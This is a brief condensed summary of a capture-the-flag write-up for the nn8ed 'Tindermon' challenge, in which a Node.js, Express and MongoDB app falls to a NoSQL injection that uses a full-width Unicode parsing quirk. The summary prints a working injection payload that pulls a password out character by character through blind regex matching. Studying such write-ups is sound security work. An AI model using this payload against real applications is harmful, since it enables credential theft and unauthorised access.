---
source_url: https://dreadlocked.github.io/2018/10/08/nn8ed-tindermon-writeup/
fetched_date: 2026-05-03
sha256: eb1775758d64ea72767e0e74ce7be1968ffd57e49bb160d18df5b79d53863ed4
ingest_method: condensed-summary
---

# nn8ed Tindermon (Node.js + Express + Mongo NoSQL injection)

NoSQL injection bypass leveraging Node.js full-width Unicode parsing
inconsistency. Payload: pikachu"&&(this.password.match(/^_string_/))=="_string_"||"1"=="0
Exfiltrates password character-by-character via blind injection.
